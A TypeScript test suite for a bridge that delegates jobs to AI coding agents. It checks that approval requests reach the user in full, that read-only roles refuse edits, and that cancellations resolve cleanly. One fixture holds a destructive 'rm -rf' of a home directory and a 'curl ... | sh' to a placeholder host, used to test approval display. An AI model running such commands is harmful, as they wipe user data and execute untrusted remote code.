import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { AntigravityAdapter } from '../plugin/bridge/adapters/antigravity.ts';
import { CodexAdapter } from '../plugin/bridge/adapters/codex.ts';
import { resolveConfig } from '../plugin/bridge/config.ts';
import { Jobs } from '../plugin/bridge/jobs.ts';
import type { Job, WorkerAgent } from '../plugin/bridge/jobs.ts';

const command = 'echo first\necho ' + 'a'.repeat(160) + '\necho last';
const stub = `
const readline = require('node:readline');
const send = (msg) => console.log(JSON.stringify({ jsonrpc: '2.0', ...msg }));
const notify = (method, params) => send({ method, params });
const ask = (id, threadId, command) => send({
  id, method: 'item/commandExecution/requestApproval',
  params: { threadId, turnId: threadId + '-turn', cwd: '/tmp', command },
});
let childStarted = false;
let interrupted = false;
readline.createInterface({ input: process.stdin }).on('line', (line) => {
  const msg = JSON.parse(line);
  if (msg.method === 'turn/start') {
    send({ id: msg.id, result: { turn: { id: 'parent-turn' } } });
    if (!childStarted) {
      notify('thread/started', { thread: { id: 'child', parentThreadId: 'parent' } });
      childStarted = true;
    }
    ask('a', 'child', ${JSON.stringify(command)});
    ask('b', 'parent', 'echo second');
    return;
  }
  if (msg.method === 'thread/start') {
    send({ id: msg.id, result: { thread: { id: 'parent' } } });
    return;
  }
  if (msg.method === 'turn/interrupt') {
    interrupted = true;
    notify('turn/completed', { threadId: 'parent', turn: { id: 'parent-turn', status: 'interrupted' } });
    return;
  }
  if (msg.method && msg.id != null) send({ id: msg.id, result: {} });
  if (interrupted) return;
  if (msg.id === 'a') {
    notify('serverRequest/resolved', { threadId: 'child', requestId: 'a' });
    notify('item/started', { threadId: 'parent', item: { type: 'commandExecution', command: 'echo progress' } });
    notify('turn/completed', { threadId: 'child', turn: { id: 'child-turn', status: 'completed' } });
  }
  if (msg.id === 'b') {
    notify('item/completed', { threadId: 'parent', item: { type: 'agentMessage', text: msg.result.decision } });
    notify('turn/completed', { threadId: 'parent', turn: { id: 'parent-turn', status: 'completed' } });
  }
});
`;

function harness(source: string, agent: WorkerAgent = 'codex', roles: Parameters<typeof resolveConfig>[0]['roles'] = {}) {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'crew-codex-test-'));
  const bin = path.join(home, 'codex');
  fs.writeFileSync(bin, `#!${process.execPath}\n${source}`, { mode: 0o700 });
  const config = resolveConfig({
    notify: false,
    codex: { bin, approvalPolicy: 'on-request', approvalsReviewer: 'auto_review' },
    antigravity: { bin, enabled: true },
    roles,
  });
  const adapter = agent === 'codex' ? new CodexAdapter(config) : new AntigravityAdapter(config);
  const jobs = new Jobs(home, () => config, { codex: adapter, antigravity: adapter }, {
    onEvent: () => {}, onJob: () => {}, onAttention: () => {},
  });
  return { adapter, bin, home, jobs };
}

test('routes a child approval and preserves overlapping approvals and the full command', { timeout: 5000 }, async (t) => {
  const { adapter, home, jobs } = harness(stub);
  t.after(() => { adapter.shutdown(); jobs.flush(); fs.rmSync(home, { recursive: true, force: true }); });
  const job = await jobs.create({ kind: 'delegate', cwd: home, isolation: 'in_place', task: 'test' });
  const waiting = async () => {
    while (!job.waiting) await jobs.wait(job.id, job.seq, 1000);
    return job.waiting;
  };
  const first = await waiting();
  assert.ok(first.reason.includes(command));
  assert.ok(first.reason.includes('/tmp'));
  await jobs.reply(job.id, { decision: 'approve', request_id: first.id });
  const second = await waiting();
  assert.match(second.reason, /echo second/);
  await assert.rejects(jobs.reply(job.id, { decision: 'approve', request_id: first.id }), /no longer pending/);
  await assert.rejects(jobs.reply(job.id, { decision: 'approve' }), /Pass the request_id/);
  assert.equal(job.waiting, second);
  await jobs.reply(job.id, { decision: 'deny', request_id: second.id });
  while (!job.endedAt) await jobs.wait(job.id, job.seq, 1000);
  assert.equal(job.report, 'decline');
  await jobs.reply(job.id, { message: 'send the same child another task' });
  assert.ok((await waiting()).reason.includes(command));
  await jobs.cancel(job.id);
  assert.equal(job.state, 'cancelled');
});

test('a hung initialize fails the job and the next job can start a fresh server', { timeout: 5000 }, async (t) => {
  const { adapter, bin, home, jobs } = harness('process.stdin.resume();');
  t.after(() => { adapter.shutdown(); jobs.flush(); fs.rmSync(home, { recursive: true, force: true }); });
  t.mock.timers.enable({ apis: ['setTimeout'] });
  const job = await jobs.create({ kind: 'delegate', cwd: home, isolation: 'in_place', task: 'test' });
  t.mock.timers.tick(30_001);
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(job.state, 'failed');
  assert.match(job.error!.message, /initialize.*timed out/);
  t.mock.timers.reset();
  fs.writeFileSync(bin, `#!${process.execPath}\n${stub}`);
  const next = await jobs.create({ kind: 'delegate', cwd: home, isolation: 'in_place', task: 'test' });
  while (!next.waiting) await jobs.wait(next.id, next.seq, 1000);
  assert.equal(next.sessionId, 'parent');
});

test('Antigravity uses the advertised restore method and waits for cancellation', { timeout: 5000 }, async (t) => {
  const { adapter, home, jobs } = harness(`
    let promptId;
    const result = (id, result) => console.log(JSON.stringify({ jsonrpc: '2.0', id, result }));
    require('node:readline').createInterface({ input: process.stdin }).on('line', (line) => {
      const { method, id } = JSON.parse(line);
      if (method === 'initialize') result(id, { agentCapabilities: { loadSession: true } });
      else if (method === 'session/new') result(id, { sessionId: 'saved' });
      else if (method === 'session/load') result(id, {});
      else if (method === 'session/prompt') promptId = id;
      else if (method === 'session/cancel') console.log(JSON.stringify({
        jsonrpc: '2.0', id: 'late-permission', method: 'session/request_permission',
        params: { sessionId: 'saved', toolCall: { kind: 'read' }, options: [{ kind: 'allow_once', optionId: 'read' }] },
      }));
      else if (id === 'late-permission') {
        const { outcome } = JSON.parse(line).result.outcome;
        result(promptId, { stopReason: outcome === 'cancelled' ? 'cancelled' : 'refusal' });
      }
      else console.log(JSON.stringify({ jsonrpc: '2.0', id, error: { code: -32601, message: method } }));
    });
  `, 'antigravity');
  t.after(async () => {
    adapter.shutdown();
    await new Promise((resolve) => setImmediate(resolve));
    jobs.flush();
    fs.rmSync(home, { recursive: true, force: true });
  });
  const job = await jobs.create({ kind: 'polish', cwd: home, isolation: 'in_place', targets: ['README.md'] });
  while (job.phase === 'starting') await jobs.wait(job.id, job.seq, 1000);
  const cancelling = jobs.cancel(job.id);
  assert.equal(job.state, 'running');
  await cancelling;
  assert.equal(job.state, 'cancelled');
  adapter.shutdown();
  await jobs.reply(job.id, { message: 'resume after restart' });
  assert.equal(job.state, 'running', job.error?.message);
  await jobs.cancel(job.id);
  assert.equal(job.state, 'cancelled');
});

/** ACP stub that asks permission for each tool call in \`calls\`, then ends the turn reporting the outcomes. */
const permissionStub = (calls: object[], options: object[] = [{ kind: 'allow_always', optionId: 'always' }, { kind: 'allow_once', optionId: 'yes' }, { kind: 'reject_always', optionId: 'never' }, { kind: 'reject_once', optionId: 'no' }]) => `
  const calls = ${JSON.stringify(calls)};
  const outcomes = [];
  let promptId, promptText;
  const send = (msg) => console.log(JSON.stringify({ jsonrpc: '2.0', ...msg }));
  const options = ${JSON.stringify(options)};
  require('node:readline').createInterface({ input: process.stdin }).on('line', (line) => {
    const msg = JSON.parse(line);
    if (msg.method === 'initialize') send({ id: msg.id, result: { agentCapabilities: {} } });
    else if (msg.method === 'session/new') send({ id: msg.id, result: { sessionId: 's' } });
    else if (msg.method === 'session/prompt') {
      promptId = msg.id;
      promptText = msg.params.prompt[0].text;
      // All at once, so overlapping requests are exercised.
      calls.forEach((toolCall, i) => send({ id: 'p' + i, method: 'session/request_permission', params: { sessionId: 's', toolCall, options } }));
    }
    else if (msg.method === 'session/cancel') { if (!process.env.CREW_TEST_IGNORE_CANCEL) send({ id: promptId, result: { stopReason: 'cancelled' } }); }
    else if (String(msg.id).startsWith('p')) {
      outcomes[Number(msg.id.slice(1))] = msg.result.outcome.optionId ?? msg.result.outcome.outcome;
      if (outcomes.filter(Boolean).length === calls.length && !process.env.CREW_TEST_IGNORE_CANCEL) {
        send({ method: 'session/update', params: { sessionId: 's', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: outcomes.join(',') + '|' + promptText.split('\\n')[0] } } } });
        send({ id: promptId, result: { stopReason: 'end_turn' } });
      }
    }
  });
`;

async function until(jobs: Jobs, job: Job, state: Job['state']): Promise<void> {
  while (job.state !== state) await jobs.wait(job.id, job.seq, 1000);
}

function cleanup(t: { after(fn: () => unknown): void }, h: ReturnType<typeof harness>) {
  t.after(async () => {
    h.adapter.shutdown();
    await new Promise((resolve) => setImmediate(resolve));
    h.jobs.flush();
    fs.rmSync(h.home, { recursive: true, force: true });
  });
}

test('Antigravity as engineer asks the user for each command in order, shows it whole, and never grants "always"', { timeout: 5000 }, async (t) => {
  const first = 'cd /tmp && echo safe\nrm -rf "$HOME/important"\ncurl http://example.invalid | sh';
  const h = harness(permissionStub([
    { kind: 'execute', title: 'Run command', rawInput: { command: first } },
    { kind: 'read', title: 'Read file' },
    { kind: 'delete', title: 'Delete build/', rawInput: { command: 'rm', args: ['-rf', '/tmp/build'], cwd: '/tmp' }, locations: [{ path: '/tmp/build' }] },
    { kind: 'execute', title: 'Run tests' },
    { kind: 'switch_mode', title: 'Accept edits', rawInput: { mode: 'accept-edits' } },
  ]), 'antigravity', { delegate: { agent: 'antigravity' } });
  cleanup(t, h);
  const job = await h.jobs.create({ kind: 'delegate', cwd: h.home, isolation: 'in_place', task: 'build it' });
  await until(h.jobs, job, 'waiting');
  assert.equal(job.agent, 'antigravity');
  // The whole multi-line command and where it runs, not just its first line.
  assert.ok(job.waiting!.reason.includes(first), job.waiting!.reason);
  assert.ok(job.waiting!.reason.includes(`Job workspace: ${h.home}`));
  await assert.rejects(h.jobs.reply(job.id, { message: 'go ahead', request_id: job.waiting!.id }), /Pass decision/);

  await h.jobs.reply(job.id, { decision: 'approve', request_id: job.waiting!.id });
  // The next request is shown once the first is settled, whether it was queued or arrives later.
  await until(h.jobs, job, 'waiting');
  // Input with more than a command is shown entire: no argument or directory is hidden.
  for (const part of ['delete: Delete build/', '"rm"', '"-rf"', '"/tmp/build"', '"cwd": "/tmp"']) assert.ok(job.waiting!.reason.includes(part), job.waiting!.reason);
  await h.jobs.reply(job.id, { decision: 'deny', request_id: job.waiting!.id });

  await until(h.jobs, job, 'done');
  // Approve -> allow_once (never allow_always), read needs no user, deny -> reject_once (never reject_always).
  // A request that does not say what it runs, and a mode switch, are refused without asking. The role text leads the prompt.
  assert.equal(job.report, 'yes,yes,no,no,no|# Role: supporting engineer');
  assert.equal(job.notes.filter((n) => n.includes('refused')).length, 2);
  assert.ok(job.notes.some((n) => n.includes('execute request without its input: Run tests')));
});

test('Antigravity as reviewer is read-only: edits and commands are refused without asking, and noted', { timeout: 5000 }, async (t) => {
  const h = harness(permissionStub([
    { kind: 'read', title: 'Read file' },
    { kind: 'edit', title: 'Fix it', locations: [{ path: '/nonexistent/app.js' }] },
    { kind: 'execute', title: 'npm test' },
  ]), 'antigravity', { review: { agent: 'antigravity' } });
  cleanup(t, h);
  await assert.rejects(h.jobs.create({ kind: 'review', cwd: h.home, review: { target: { type: 'uncommittedChanges' }, mode: 'standard' } }), /has to be handed the diff, and .* is not inside a git repository/);
  const repo = path.join(h.home, 'repo');
  fs.mkdirSync(repo);
  execFileSync('git', ['init', '-q'], { cwd: repo });
  execFileSync('git', ['-c', 'user.email=t@example.com', '-c', 'user.name=T', 'commit', '-qm', 'init', '--allow-empty'], { cwd: repo });
  fs.writeFileSync(path.join(repo, 'new.js'), 'export const y = 2;\n');
  const job = await h.jobs.create({ kind: 'review', cwd: repo, review: { target: { type: 'uncommittedChanges' }, mode: 'standard' } });
  // It cannot run git, so the bridge saves the change for it and says so; untracked files are named.
  const diffFile = path.join(h.home, 'reviews', `${job.id}.diff`);
  assert.ok(job.prompt.includes(diffFile) && !job.prompt.includes('git diff'), job.prompt);
  assert.match(fs.readFileSync(diffFile, 'utf8'), /Untracked files[^\n]*\nnew\.js/);
  while (job.state !== 'done') {
    assert.notEqual(job.state, 'waiting');
    await h.jobs.wait(job.id, job.seq, 1000);
  }
  assert.equal(job.report, 'yes,no,no|# Role: adversarial reviewer');
  assert.ok(job.notes.some((n) => /outside the reviewer role \(edit during a read-only review: Fix it\)/.test(n)), job.notes.join('\n'));
  assert.ok(job.notes.some((n) => n.includes('could not run tests or checks')));
  assert.ok(job.notes.some((n) => n.includes("standard review mode is Codex's own")));
  // The saved diff goes stale, so it does not outlive the review.
  await new Promise((resolve) => setTimeout(resolve, 50));
  assert.equal(fs.existsSync(diffFile), false);
});

test('cancelling an Antigravity job that waits on the user answers the request as cancelled', { timeout: 5000 }, async (t) => {
  const h = harness(permissionStub([{ kind: 'execute', title: 'npm test', rawInput: 'npm test' }, { kind: 'execute', title: 'npm run build', rawInput: 'npm run build' }]), 'antigravity', { delegate: { agent: 'antigravity' } });
  cleanup(t, h);
  const job = await h.jobs.create({ kind: 'delegate', cwd: h.home, isolation: 'in_place', task: 'build it' });
  await until(h.jobs, job, 'waiting');
  const request = job.waiting!.id;
  await h.jobs.cancel(job.id);
  assert.equal(job.state, 'cancelled');
  assert.equal(job.waiting, null);
  await assert.rejects(h.jobs.reply(job.id, { decision: 'approve', request_id: request }), /no longer pending/);
});

test('a deny uses "reject always" only when it is the only refusal offered, and an approval that cannot be given once is noted', { timeout: 5000 }, async (t) => {
  const h = harness(permissionStub(
    [{ kind: 'execute', title: 'first', rawInput: 'echo 1' }, { kind: 'execute', title: 'second', rawInput: 'echo 2' }],
    [{ kind: 'allow_always', optionId: 'always' }, { kind: 'reject_always', optionId: 'never' }],
  ), 'antigravity', { delegate: { agent: 'antigravity' } });
  cleanup(t, h);
  const job = await h.jobs.create({ kind: 'delegate', cwd: h.home, isolation: 'in_place', task: 'build it' });
  await until(h.jobs, job, 'waiting');
  await h.jobs.reply(job.id, { decision: 'approve', request_id: job.waiting!.id });
  await until(h.jobs, job, 'waiting');
  await h.jobs.reply(job.id, { decision: 'deny', request_id: job.waiting!.id });
  await until(h.jobs, job, 'done');
  // "Always" is never chosen to approve; with no one-time approval the action is not run, and the lead is told.
  assert.equal(job.report, 'cancelled,never|# Role: supporting engineer');
  assert.ok(job.notes.some((n) => n.includes('offered no one-time approval: first')), job.notes.join('\n'));
});

test('a cancel the agent never confirms does not leave the job waiting on a request that is gone', { timeout: 10000 }, async (t) => {
  process.env.CREW_TEST_IGNORE_CANCEL = '1';
  const h = harness(permissionStub([{ kind: 'execute', title: 'npm test', rawInput: 'npm test' }]), 'antigravity', { delegate: { agent: 'antigravity' } });
  // The agent process is spawned by the first job and inherits this.
  t.after(() => delete process.env.CREW_TEST_IGNORE_CANCEL);
  cleanup(t, h);
  const job = await h.jobs.create({ kind: 'delegate', cwd: h.home, isolation: 'in_place', task: 'build it' });
  await until(h.jobs, job, 'waiting');
  await assert.rejects(h.jobs.cancel(job.id), /did not confirm cancellation/);
  assert.equal(job.state, 'running');
  assert.equal(job.waiting, null);
});

test('Codex runs an app job with network access and reports what its reviewer refused', { timeout: 5000 }, async (t) => {
  const { adapter, home, jobs } = harness(`
    const fs = require('node:fs');
    const send = (msg) => console.log(JSON.stringify({ jsonrpc: '2.0', ...msg }));
    let turns = 0;
    require('node:readline').createInterface({ input: process.stdin }).on('line', (line) => {
      const msg = JSON.parse(line);
      if (msg.method === 'thread/start' || msg.method === 'turn/start') fs.appendFileSync(__dirname + '/seen.jsonl', line + '\\n');
      if (msg.method === 'thread/start') return send({ id: msg.id, result: { thread: { id: 'thread' } } });
      if (msg.method !== 'turn/start') return msg.id != null && send({ id: msg.id, result: {} });
      send({ id: msg.id, result: { turn: { id: 'turn' } } });
      const review = (status) => send({ method: 'item/autoApprovalReview/completed', params: {
        threadId: 'thread', review: { status, rationale: 'writes outside the workspace' }, action: { type: 'command', command: 'touch ~/probe' },
      } });
      review('approved');
      if (turns++ < 2) review('denied');
      send({ method: 'turn/completed', params: { threadId: 'thread', turn: { id: 'turn', status: 'completed' } } });
    });
  `);
  t.after(() => { adapter.shutdown(); jobs.flush(); fs.rmSync(home, { recursive: true, force: true }); });
  const job = await jobs.create({ kind: 'delegate', cwd: home, isolation: 'in_place', task: 'test', runsApp: true });
  const ended = async () => {
    while (!job.endedAt) await jobs.wait(job.id, job.seq, 1000);
  };
  await ended();
  assert.deepEqual(job.refusals, [{ action: 'touch ~/probe', reason: 'writes outside the workspace', turn: 1 }]);
  // Refused again after the first retry, so the second one is the user's to answer.
  for (let retry = 0; retry < 2; retry++) {
    await jobs.reply(job.id, { approved_by_user: 'yes, write it' });
    await ended();
  }

  await jobs.reply(job.id, { message: 'thanks' });
  await ended();

  const seen = fs.readFileSync(path.join(home, 'seen.jsonl'), 'utf8').trim().split('\n').map((line) => JSON.parse(line).params);
  assert.deepEqual(seen[0].config.sandbox_workspace_write, { network_access: true });
  const crew = seen[0].config.mcp_servers.crew;
  assert.equal(crew.command, process.execPath);
  assert.equal(crew.args[0], path.resolve('plugin/bridge/worker-mcp.ts'));
  assert.equal(crew.env.CREW_JOB_ID, job.id);
  assert.match(crew.env.CREW_JOB_TOKEN, /^[0-9a-f]{64}$/);
  assert.ok(jobs.workerAuthorized(job.id, crew.env.CREW_JOB_TOKEN));
  assert.equal(seen[0].approvalsReviewer, 'auto_review');
  assert.deepEqual(seen.slice(1).map((turn) => turn.approvalsReviewer), ['auto_review', 'auto_review', 'user', 'auto_review']);
});

test('a read-only question never prompts and never asks the user to allow a write', { timeout: 5000 }, async (t) => {
  const { adapter, home, jobs } = harness(stub);
  t.after(() => { adapter.shutdown(); jobs.flush(); fs.rmSync(home, { recursive: true, force: true }); });
  const job = await jobs.create({ kind: 'delegate', ask: true, cwd: home, task: 'what does this do?' });
  assert.equal(job.sandbox, 'read-only');
  let waited = false;
  while (!job.endedAt) {
    await jobs.wait(job.id, job.seq, 1000);
    waited ||= Boolean(job.waiting);
  }
  assert.equal(waited, false);
  assert.equal(job.report, 'decline');
  assert.ok(job.notes.some((note) => note.startsWith('Declined in a read-only job: Run:')));
});


test('Codex accepts only crew MCP approvals, including correlated legacy input requests', { timeout: 5000 }, async (t) => {
  const h = harness(`
    const send = (msg) => console.log(JSON.stringify({ jsonrpc: '2.0', ...msg }));
    const requests = [
      ...['ask_lead', 'lead_answers', 'siblings'].map((tool_name) => ({ serverName: 'crew', tool_name, expected: 'accept' })),
      { serverName: 'other', tool_name: 'ask_lead', expected: 'decline' },
      { serverName: 'crew', tool_name: 'delete', expected: 'decline' },
      { serverName: 'crew', tool_name: 'ask_lead', approvalKind: 'browser_auth', expected: 'decline' },
    ];
    const outcomes = [];
    require('node:readline').createInterface({ input: process.stdin }).on('line', (line) => {
      const msg = JSON.parse(line);
      if (msg.method === 'thread/start') return send({ id: msg.id, result: { thread: { id: 'thread' } } });
      if (msg.method === 'turn/start') {
        send({ id: msg.id, result: { turn: { id: 'turn' } } });
        requests.forEach((r, i) => send({ id: 'mcp-' + i, method: 'mcpServer/elicitation/request', params: {
          threadId: 'thread', turnId: 'turn', serverName: r.serverName, mode: 'form', message: 'Approve tool?',
          requestedSchema: { type: 'object', properties: {} },
          _meta: { codex_approval_kind: r.approvalKind || 'mcp_tool_call', tool_name: r.tool_name },
        } }));
        send({ method: 'item/started', params: { threadId: 'thread', item: { id: 'call', type: 'mcpToolCall', server: 'crew', tool: 'ask_lead' } } });
        send({ id: 'legacy', method: 'item/tool/requestUserInput', params: {
          threadId: 'thread', turnId: 'turn', itemId: 'call', isBlocking: true,
          questions: [{ id: 'mcp_tool_call_approval_call', header: 'Approve app tool call?', question: 'Allow?', options: [{ label: 'Allow', description: 'Run the tool and continue.' }] }],
        } });
        return;
      }
      if (String(msg.id).startsWith('mcp-')) {
        const r = requests[Number(msg.id.slice(4))];
        outcomes.push(msg.result.action === r.expected);
      } else if (msg.id === 'legacy') outcomes.push(msg.result.answers.mcp_tool_call_approval_call.answers[0] === 'Allow');
      else if (msg.method && msg.id != null) return send({ id: msg.id, result: {} });
      if (outcomes.length === requests.length + 1) {
        send({ method: 'item/completed', params: { threadId: 'thread', item: { type: 'agentMessage', text: JSON.stringify(outcomes) } } });
        send({ method: 'turn/completed', params: { threadId: 'thread', turn: { id: 'turn', status: 'completed' } } });
      }
    });
  `);
  cleanup(t, h);
  const job = await h.jobs.create({ kind: 'delegate', cwd: h.home, isolation: 'in_place', task: 'test' });
  while (!job.endedAt) {
    await h.jobs.wait(job.id, job.seq, 1000);
    assert.equal(job.waiting, null);
  }
  assert.deepEqual(JSON.parse(job.report), Array(7).fill(true));
});

test('Codex merges crew MCP into a read-only permissions profile', { timeout: 5000 }, async (t) => {
  const h = harness(`
    const send = (msg) => console.log(JSON.stringify({ jsonrpc: '2.0', ...msg }));
    require('node:readline').createInterface({ input: process.stdin }).on('line', (line) => {
      const msg = JSON.parse(line);
      if (msg.method === 'thread/start') {
        require('node:fs').writeFileSync(__dirname + '/config.json', JSON.stringify(msg.params.config));
        return send({ id: msg.id, result: { thread: { id: 'thread' } } });
      }
      if (msg.method === 'turn/start') {
        send({ id: msg.id, result: { turn: { id: 'turn' } } });
        send({ method: 'turn/completed', params: { threadId: 'thread', turn: { id: 'turn', status: 'completed' } } });
      } else if (msg.id != null) send({ id: msg.id, result: {} });
    });
  `);
  cleanup(t, h);
  const job = await h.jobs.create({ kind: 'delegate', ask: true, cwd: h.home, task: 'why?' });
  await until(h.jobs, job, 'done');
  const config = JSON.parse(fs.readFileSync(path.join(h.home, 'config.json'), 'utf8'));
  assert.equal(config.default_permissions, 'crew_read_only');
  assert.equal(config.permissions.crew_read_only.filesystem[job.scratch!], 'write');
  assert.equal(config.mcp_servers.crew.env.CREW_JOB_ID, job.id);
  // Codex refuses an MCP call outright under approval policy "never" unless the server's tools are approved in advance.
  assert.equal(config.mcp_servers.crew.default_tools_approval_mode, 'approve');
});

test('Antigravity passes crew MCP on new and restored sessions and permits identified crew calls', { timeout: 5000 }, async (t) => {
  const h = harness(`
    const send = (msg) => console.log(JSON.stringify({ jsonrpc: '2.0', ...msg }));
    let prompt;
    require('node:readline').createInterface({ input: process.stdin }).on('line', (line) => {
      const msg = JSON.parse(line);
      if (msg.method === 'initialize') return send({ id: msg.id, result: { agentCapabilities: { loadSession: true } } });
      if (msg.method === 'session/new' || msg.method === 'session/load') {
        require('node:fs').appendFileSync(__dirname + '/servers.jsonl', JSON.stringify(msg.params.mcpServers) + '\\n');
        return send({ id: msg.id, result: { sessionId: 'saved' } });
      }
      if (msg.method === 'session/prompt') {
        prompt = msg.id;
        return send({ id: 'permission', method: 'session/request_permission', params: {
          sessionId: 'saved', toolCall: { kind: 'other', _meta: { mcpServerName: 'crew', mcpToolName: 'ask_lead' } },
          options: [{ kind: 'allow_once', optionId: 'yes' }, { kind: 'reject_once', optionId: 'no' }],
        } });
      }
      if (msg.id === 'permission') {
        send({ method: 'session/update', params: { sessionId: 'saved', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: msg.result.outcome.optionId } } } });
        return send({ id: prompt, result: { stopReason: 'end_turn' } });
      }
      if (msg.id != null) send({ id: msg.id, result: {} });
    });
  `, 'antigravity');
  cleanup(t, h);
  const job = await h.jobs.create({ kind: 'polish', cwd: h.home, isolation: 'in_place', targets: ['README.md'] });
  await until(h.jobs, job, 'done');
  assert.equal(job.report, 'yes');
  h.adapter.shutdown();
  await h.jobs.reply(job.id, { message: 'again' });
  await until(h.jobs, job, 'done');
  assert.equal(job.report, 'yes');
  const servers = fs.readFileSync(path.join(h.home, 'servers.jsonl'), 'utf8').trim().split('\n').map((s) => JSON.parse(s));
  assert.equal(servers.length, 2);
  assert.deepEqual(servers[0], servers[1]);
  const [server] = servers[0];
  assert.equal(server.name, 'crew');
  assert.equal(server.command, process.execPath);
  assert.equal(server.args[0], path.resolve('plugin/bridge/worker-mcp.ts'));
  assert.equal(Object.fromEntries(server.env.map(({ name, value }: { name: string; value: string }) => [name, value])).CREW_JOB_ID, job.id);
});
